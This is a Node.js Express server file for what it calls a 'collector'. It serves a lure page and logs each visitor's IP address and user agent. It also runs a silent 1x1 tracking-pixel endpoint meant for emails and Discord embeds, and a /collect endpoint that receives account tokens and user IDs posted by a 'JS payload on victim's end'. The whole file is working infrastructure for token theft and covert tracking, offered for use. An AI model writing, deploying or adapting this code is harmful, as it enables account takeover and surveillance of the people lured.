// lang: JavaScript (Node.js), file: server.js, target: Railway (Node 18+)
// collector — logs IP from every hit, receives token POSTs, serves lure page

const express = require('express');
const fs      = require('fs');
const path    = require('path');

const app  = express();
const PORT = process.env.PORT || 3000;
const LOG  = path.join(__dirname, 'hits.log');

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ── helpers ──────────────────────────────────────────────────────────────────

function realIP(req) {
    return (
        req.headers['cf-connecting-ip']   ||   // Cloudflare
        req.headers['x-forwarded-for']?.split(',')[0].trim() ||
        req.socket.remoteAddress
    );
}

function stamp() {
    return new Date().toISOString();
}

function appendLog(obj) {
    const line = JSON.stringify(obj) + '\n';
    fs.appendFileSync(LOG, line, 'utf8');
    console.log('[hit]', obj);
}

// ── routes ───────────────────────────────────────────────────────────────────

// serve lure page — also logs the IP of whoever opened the link
app.get('/', (req, res) => {
    const ip = realIP(req);
    appendLog({ type: 'page_open', ip, ua: req.headers['user-agent'], ts: stamp() });
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// pixel/image endpoint — silent 1x1 GIF hit logger (embed in emails / Discord embeds)
app.get('/pixel', (req, res) => {
    const ip = realIP(req);
    appendLog({ type: 'pixel', ip, ua: req.headers['user-agent'], ts: stamp() });
    // 1x1 transparent GIF
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.writeHead(200, { 'Content-Type': 'image/gif', 'Cache-Control': 'no-store' });
    res.end(gif);
});

// token receiver — JS payload on victim's end POSTs here
app.post('/collect', (req, res) => {
    const ip    = realIP(req);
    const token = req.body.token || req.body.t || null;
    const uid   = req.body.uid   || null;
    appendLog({ type: 'token', ip, token, uid, ts: stamp() });
    res.status(200).json({ ok: true });
});

// view log (protect this in prod — add a secret param or IP allowlist)
app.get('/log', (req, res) => {
    const secret = process.env.LOG_SECRET || 'changeme';
    if (req.query.s !== secret) return res.status(403).send('no');
    if (!fs.existsSync(LOG)) return res.send('empty');
    res.setHeader('Content-Type', 'text/plain');
    res.send(fs.readFileSync(LOG, 'utf8'));
});

// clear log
app.get('/clear', (req, res) => {
    const secret = process.env.LOG_SECRET || 'changeme';
    if (req.query.s !== secret) return res.status(403).send('no');
    fs.writeFileSync(LOG, '', 'utf8');
    res.send('cleared');
});

app.listen(PORT, () => console.log(`collector up on :${PORT}`));
